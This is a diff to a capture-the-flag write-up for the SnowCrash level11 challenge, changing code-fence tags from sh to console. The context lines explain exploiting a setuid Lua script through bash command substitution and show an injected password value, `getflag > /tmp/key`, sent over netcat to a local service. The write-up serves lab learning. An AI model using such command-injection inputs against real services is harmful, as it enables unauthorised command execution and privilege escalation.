@@ -5,7 +5,7 @@
 - The home folder contain a Lua script named `level11.lua``` owned by `flag11`.
 - SETUID and SETGID bits are set.
 
-```sh
+```console
 $ ls -al
 total 16
 dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
@@ -36,7 +36,7 @@ end
 
 - By using the command substitution of `bash` (\`) we can let the script execute our favorite command, `getflag`.
 
-```sh
+```console
 $ level11@SnowCrash:~$ netcat 127.0.0.1 5151
 Password: `getflag > /tmp/key`
 ```
